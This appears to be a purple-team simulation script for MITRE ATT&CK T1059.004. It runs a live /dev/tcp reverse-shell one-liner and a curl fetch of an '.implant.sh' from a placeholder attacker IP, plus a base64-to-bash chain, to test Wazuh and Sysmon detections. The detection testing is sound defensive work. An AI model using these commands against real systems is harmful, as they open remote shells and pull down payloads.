#!/usr/bin/env bash
# =============================================================================
# T1059_command_script.sh — Command and Scripting Interpreter: Unix Shell (T1059.004)
# MITRE ATT&CK: https://attack.mitre.org/techniques/T1059/004/
#
# SIMULATION:
#   Executes patterns commonly seen in shell-based attacks:
#     1. Reverse shell connection attempt (aborted immediately — no real listener)
#     2. Base64-encoded payload decode and execution (safe dummy payload)
#     3. Spawn subshell from unexpected parent process
#
# EXPECTED DETECTIONS:
#   - Wazuh Rule 100010 (level 15): /dev/tcp reverse shell pattern
#   - Wazuh Rule 100011 (level 10): base64 -d executed by bash
#   - Sysmon EventID 1: bash spawning with suspicious CommandLine
# =============================================================================

set -euo pipefail

ATTACKER_IP="192.168.56.30"
ATTACKER_PORT="4444"

echo "[T1059.004] Simulating Unix shell attack techniques..."

# ── Step 1: Reverse shell attempt (no real listener — connection fails safely) ──
echo "[T1059.004] Step 1: Reverse shell attempt (Sysmon EventID 1 + EventID 3)"
echo "[T1059.004]   Pattern: bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1"
# We use 'timeout' to prevent hanging; the connection will be refused/timeout
timeout 3 bash -c "bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1" 2>/dev/null || true
echo "[T1059.004] ✓ Reverse shell attempt generated telemetry (connection failed as expected)"

sleep 1

# ── Step 2: Base64-encoded payload (obfuscation technique) ───────────────────
echo "[T1059.004] Step 2: Base64-decoded payload execution (Sysmon EventID 1)"
# Encode a harmless payload
PAYLOAD=$(echo 'echo "SIMULATION: T1059.004 base64 payload executed"' | base64)
echo "[T1059.004]   Encoded payload: ${PAYLOAD}"
# Decode and execute (Sysmon detects: bash → base64 -d → execution)
echo "$PAYLOAD" | base64 -d | bash
echo "[T1059.004] ✓ Base64 decode chain executed"

sleep 1

# ── Step 3: Shell spawned from unusual parent (e.g., python3) ────────────────
echo "[T1059.004] Step 3: Shell spawned via Python (living-off-the-land)"
python3 -c "import subprocess; subprocess.run(['bash', '-c', 'id && uname -a'])"
echo "[T1059.004] ✓ Python → bash spawn executed"

sleep 1

# ── Step 4: Script download simulation (curl/wget pattern) ───────────────────
echo "[T1059.004] Step 4: Simulating payload download attempt (EventID 3 NetworkConnect)"
# Hit a non-existent endpoint to generate the network telemetry
curl -s --max-time 3 "http://${ATTACKER_IP}:8080/.implant.sh" -o /tmp/sim_payload.sh 2>/dev/null || true
echo "[T1059.004] ✓ Download attempt generated network telemetry"

# Cleanup
rm -f /tmp/sim_payload.sh

echo "[T1059.004] Simulation complete. Check Wazuh for rules 100010 / 100011."
